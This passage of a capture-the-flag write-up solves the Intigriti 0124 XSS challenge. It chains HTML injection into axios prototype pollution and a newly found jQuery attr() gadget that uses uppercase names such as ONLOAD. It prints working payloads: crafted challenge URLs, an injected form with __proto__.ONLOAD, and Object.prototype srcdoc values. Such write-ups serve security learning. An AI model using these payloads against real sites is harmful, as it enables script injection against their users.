+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/user</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">foo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">bar</span><span class="dl">'</span> <span class="p">})</span>
+    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">handleResponse</span><span class="p">)</span>
+    <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">handleError</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>See the 2nd arg is actually in json format.
+So a form tag was converted into  a json object, such conversions to json objects are often vulnerable to prototype pollution so I started searching on google for “axios prototype pollution”</p>
+
+<p>The first seacrh result:</p>
+
+<p>https://security.snyk.io/vuln/SNYK-JS-AXIOS-6144788</p>
+
+<p>Commit: https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</p>
+
+<p>Indeed this is a fix for the pp bug, before there was no check for the key if it was equal to <code class="language-plaintext highlighter-rouge">__proto__</code>:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">formDataToJSON</span><span class="p">(</span><span class="nx">formData</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">function</span> <span class="nf">buildPath</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">target</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">path</span><span class="p">[</span><span class="nx">index</span><span class="o">++</span><span class="p">];</span>
+
+    <span class="k">if </span><span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">__proto__</span><span class="dl">'</span><span class="p">)</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+</code></pre></div></div>
+<p>One more file was changed in that commit which is used to check for regressions:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nf">it</span><span class="p">(</span><span class="dl">'</span><span class="s1">should resist prototype pollution CVE</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>
+
+    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo[0]</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">);</span>
+    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo[1]</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">);</span>
+    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">__proto__.x</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hack</span><span class="dl">'</span><span class="p">);</span>
+    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">constructor.prototype.y</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">);</span>
+
+    <span class="nf">expect</span><span class="p">(</span><span class="nf">formDataToJSON</span><span class="p">(</span><span class="nx">formData</span><span class="p">)).</span><span class="nf">toEqual</span><span class="p">({</span>
+      <span class="na">foo</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">],</span>
+      <span class="na">constructor</span><span class="p">:</span> <span class="p">{</span>
+        <span class="na">prototype</span><span class="p">:</span> <span class="p">{</span>
+          <span class="na">y</span><span class="p">:</span> <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span>
+        <span class="p">}</span>
+      <span class="p">}</span>
+    <span class="p">});</span>
+
+    <span class="nf">expect</span><span class="p">({}.</span><span class="nx">x</span><span class="p">).</span><span class="nf">toEqual</span><span class="p">(</span><span class="kc">undefined</span><span class="p">);</span>
+    <span class="nf">expect</span><span class="p">({}.</span><span class="nx">y</span><span class="p">).</span><span class="nf">toEqual</span><span class="p">(</span><span class="kc">undefined</span><span class="p">);</span>
+  <span class="p">});</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>This gives us an idea about how the payload will look like to trigger the prototype pollution bug:</p>
+
+<p>Sample prototype pollution payload:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">angular/material-start</span><span class="dl">"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">__proto__.x</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">hack</span><span class="dl">"</span><span class="o">/&gt;</span>
+<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Our html injection is before the form tag, so we can supply the above prototype pollution payload</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;</span>Hey <span class="nt">&lt;</span><span class="err">%</span><span class="na">-</span> <span class="na">name</span> <span class="err">%</span><span class="nt">&gt;</span>,<span class="nt">&lt;br&gt;</span>Which repo are you looking for?<span class="nt">&lt;/h2&gt;</span>
+
+<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"&lt;%= search %&gt;"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+<p>https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22<strong>proto</strong>.x%22%20value=%22hack%22/%3E%20%3C/form%3E&amp;search=angular/material-start</p>
+
+<p>It will render like this</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;</span>Hey shirley<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span> <span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"angular/material-start"</span> <span class="na">name=</span><span class="s">"q"</span><span class="nt">&gt;</span> <span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"hack"</span> <span class="na">name=</span><span class="s">"__proto__.x"</span><span class="nt">&gt;</span> <span class="nt">&lt;/form&gt;</span>,<span class="nt">&lt;br&gt;</span>Which repo are you looking for?<span class="nt">&lt;/h2&gt;</span>
+
+<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"angular/material-start"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+
+<p>See now there are two form tags with same id <code class="language-plaintext highlighter-rouge">search</code>, one is the original  and the other which we injected contains the pp payload
+As our injected form tag is first it will be used by axios instead</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
+            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
+        <span class="p">})</span>
+</code></pre></div></div>
+
+<p>Here we go , we successfully polluted the <code class="language-plaintext highlighter-rouge">x</code> property.</p>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/a8608493-c73b-428b-91a9-f4d7828c07b8" alt="image" /></p>
+
+<hr />
+
+<h1 id="prototype-pollution-gadget">Prototype Pollution Gadget</h1>
+
+<p>As I had no idea about how to get xss for now, I though why not try looking for a pp gadget in axios or jquery.As that can give easy xss.
+Here you can find a bunch of gadgets for jquery: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md#xoff-jquery-all-versions</p>
+
+<p>For axios I didn’t find anything from google search and the jquery ones didn’t seemed related to the challenge.</p>
+
+<p>So the only possible way was to look for a new jquery gadget :)</p>
+
+<p>To make the process easiere I was using a local version which had the jquery unminified version</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script</span><span class="err">/</span><span class="na">src=</span><span class="s">https://code.jquery.com/jquery-3.7.1.js</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+  
+  <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">test</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
+
+<span class="nt">&lt;/script&gt;</span>
+
+<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"avatar"</span> <span class="na">width=</span><span class="s">"35%"</span> <span class="na">src=</span><span class="s">"https://avatars.githubusercontent.com/u/52466165?v=4"</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"description"</span><span class="nt">&gt;</span>A tool to calculate the contrast ratio between any two valid CSS colors.<span class="nt">&lt;/p&gt;</span>
+
+
+<span class="nt">&lt;script&gt;</span>
+<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">hello</span><span class="dl">"</span><span class="p">);</span>
+       <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
+                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
+                <span class="p">});</span>
+<span class="nt">&lt;/script&gt;</span>
+
+
+</code></pre></div></div>
+
+<p>One thing was starnge after using a pp payload, this error appeared in the console:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Uncaught</span> <span class="nx">TypeError</span><span class="p">:</span> <span class="nx">Cannot</span> <span class="nx">use</span> <span class="dl">'</span><span class="s1">in</span><span class="dl">'</span> <span class="nx">operator</span> <span class="nx">to</span> <span class="nx">search</span> <span class="k">for</span> <span class="dl">'</span><span class="s1">set</span><span class="dl">'</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">()</span><span class="o">&gt;</span>
+    <span class="nx">at</span> <span class="nf">attr </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">7910</span><span class="p">:</span><span class="mi">24</span><span class="p">)</span>
+    <span class="nx">at</span> <span class="nf">access </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">3919</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span>
+    <span class="nx">at</span> <span class="nf">access </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">3890</span><span class="p">:</span><span class="mi">4</span><span class="p">)</span>
+    <span class="nx">at</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">fn</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nf">attr </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">7872</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span>
+    <span class="nx">at</span> <span class="nx">tset2</span><span class="p">.</span><span class="nx">htm</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">23</span>
+</code></pre></div></div>
+
+<p>The statement <code class="language-plaintext highlighter-rouge">"set" in hooks</code> was triggering this error, as set property is there only in case of objects but turns out hooks was containing a string.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>			<span class="k">if </span><span class="p">(</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">set</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span>
+				<span class="p">(</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">hooks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
+			<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Tracing it back from where hooks came from</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if </span><span class="p">(</span> <span class="nx">nType</span> <span class="o">!==</span> <span class="mi">1</span> <span class="o">||</span> <span class="o">!</span><span class="nx">jQuery</span><span class="p">.</span><span class="nf">isXMLDoc</span><span class="p">(</span> <span class="nx">elem</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nx">hooks</span> <span class="o">=</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span> <span class="o">||</span>
+                <span class="p">(</span> <span class="nx">jQuery</span><span class="p">.</span><span class="nx">expr</span><span class="p">.</span><span class="nx">match</span><span class="p">.</span><span class="nx">bool</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">?</span> <span class="nx">boolHook</span> <span class="p">:</span> <span class="kc">undefined</span> <span class="p">);</span>
+        <span class="p">}</span>
+</code></pre></div></div>
+
+<p>somehow <code class="language-plaintext highlighter-rouge">name</code> contains the polluted property for eg in this case <code class="language-plaintext highlighter-rouge">test</code></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">test</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
+</code></pre></div></div>
+
+<p>Normally it would return undefined but due to the prototype pollution</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span>
+<span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="dl">"</span><span class="s2">test</span><span class="dl">"</span><span class="p">.</span><span class="nf">toLowercase</span><span class="p">()</span> <span class="p">]</span> <span class="nx">was</span> <span class="nx">returning</span> <span class="nx">a</span> <span class="nx">string</span> <span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
+</code></pre></div></div>
+
+<p>Tracing more backwards to see where name is coming from</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span> <span class="p">{</span>
+    <span class="na">attr</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="p">)</span> <span class="p">{</span>
+</code></pre></div></div>
+<p>name -&gt; test</p>
+
+<p>value -&gt; <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert()&gt;</code></p>
+
+<p>Tracing from where this function was called:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if </span><span class="p">(</span> <span class="nx">fn</span> <span class="p">)</span> <span class="p">{</span>
+			<span class="k">for </span><span class="p">(</span> <span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+				<span class="nf">fn</span><span class="p">(</span>
+					<span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">key</span><span class="p">,</span> <span class="nx">raw</span> <span class="p">?</span>
+						<span class="nx">value</span> <span class="p">:</span>
+						<span class="nx">value</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span> <span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">i</span><span class="p">,</span> <span class="nf">fn</span><span class="p">(</span> <span class="nx">elems</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">)</span>
+				<span class="p">);</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">for </span><span class="p">(</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
+			<span class="nf">access</span><span class="p">(</span> <span class="nx">elems</span><span class="p">,</span> <span class="nx">fn</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">key</span><span class="p">[</span> <span class="nx">i</span> <span class="p">],</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">emptyGet</span><span class="p">,</span> <span class="nx">raw</span> <span class="p">);</span>
+		<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/3bd3aa7a-f77a-4062-96a5-796f64db3b98" alt="image" /></p>
+
+<p>elems contains a reference to the iframe element and key contains the json object which passed in as argument to the attr method</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
+                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://google.com</span><span class="dl">"</span><span class="p">,</span>
+                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<p>so key was equal to</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
+ <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">https://google.com</span><span class="dl">"</span><span class="p">,</span>
+ <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Thanks to the prototype pollution bug, even though only two attributes were provided (src,hidden)</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">for </span><span class="p">(</span> <span class="nx">i</span> <span class="k">in</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
+			<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
+		<span class="p">}</span>
+</code></pre></div></div>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/b0479b85-9ef0-45be-90da-27d131b993d1" alt="image" /></p>
+
+<p>See <code class="language-plaintext highlighter-rouge">test</code> came from the <code class="language-plaintext highlighter-rouge">__proto__</code></p>
+
+<p>If I can somehow fix that “set” in error , I would be able to get a very simple xss as</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if </span><span class="p">(</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="dl">"</span><span class="s2">set</span><span class="dl">"</span> <span class="k">in</span> <span class="nx">hooks</span> <span class="o">&amp;&amp;</span> <span class="c1">// error trigger here</span>
+                <span class="p">(</span> <span class="nx">ret</span> <span class="o">=</span> <span class="nx">hooks</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span> <span class="nx">elem</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">name</span> <span class="p">)</span> <span class="p">)</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="k">return</span> <span class="nx">ret</span><span class="p">;</span>
+            <span class="p">}</span>
+
+            <span class="nx">elem</span><span class="p">.</span><span class="nf">setAttribute</span><span class="p">(</span> <span class="nx">name</span><span class="p">,</span> <span class="nx">value</span> <span class="o">+</span> <span class="dl">""</span> <span class="p">);</span> <span class="c1">// here is the sink</span>
+            <span class="k">return</span> <span class="nx">value</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>For other attributes <code class="language-plaintext highlighter-rouge">hooks</code> is undefined so it skips the if statement and directly reaches the sink which sets the attribute to the elem (refrencing to the iframe tag)</p>
+
+<p>By polluting some properties like this, it can give you xss (if you can somehow skip the hooks if condition check)</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">srcdoc</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>
+<span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">onload</span><span class="o">=</span><span class="dl">"</span><span class="s2">alert()</span><span class="dl">"</span>
+</code></pre></div></div>
+
+<p>This is where it took me much time to figure out the solution https://gist.github.com/Sudistark/d869e505c8ff45c3bb96612bcb2c953b even tried asking Mizu if I was on the right path or not</p>
+
+<p>He told me yeah it should work as this is the unintended solution which everyone was using :p,as I knew there must be something I am still missing I looked at it again and again to fix it but still had no success.
+I was looking for a way to make hooks undefined,which didn’t looked possible as the polluted property will be available to all the objects.</p>
+
+<p>Next day when I again looked at it, I noticed that:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span> <span class="nx">name</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>They were transforming the polluted property to lowercase before using it, so if for eg pollute a propert <code class="language-plaintext highlighter-rouge">SRCDOC</code></p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">SRCDOC</span><span class="o">=</span><span class="mi">1337</span>
+
+<span class="nx">jQuery</span><span class="p">.</span><span class="nx">attrHooks</span><span class="p">[</span><span class="dl">"</span><span class="s2">srcdoc</span><span class="dl">"</span><span class="p">]</span> <span class="c1">// undefined as only the SRCDOC exists not srcdoc in the prototype chain</span>
+</code></pre></div></div>
+
+<p>Due to the lowercase transformation it was possible to make hooks undefined and reach the sink easily.</p>
+
+<p>https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22<strong>proto</strong>.ONLOAD%22%20value=%22alert()%22/%3E%20%3C/form%3E&amp;search=angular/material-start</p>
+
+<p>Final payload</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span> 
+<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"angular/material-start"</span><span class="nt">&gt;</span> 
+<span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"__proto__.ONLOAD"</span> <span class="na">value=</span><span class="s">"alert()"</span><span class="nt">/&gt;</span> 
+<span class="nt">&lt;/form&gt;</span>
+</code></pre></div></div>
+
+<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/287124f6-67ef-47e9-b347-a095a98f2124" alt="image" /></p>
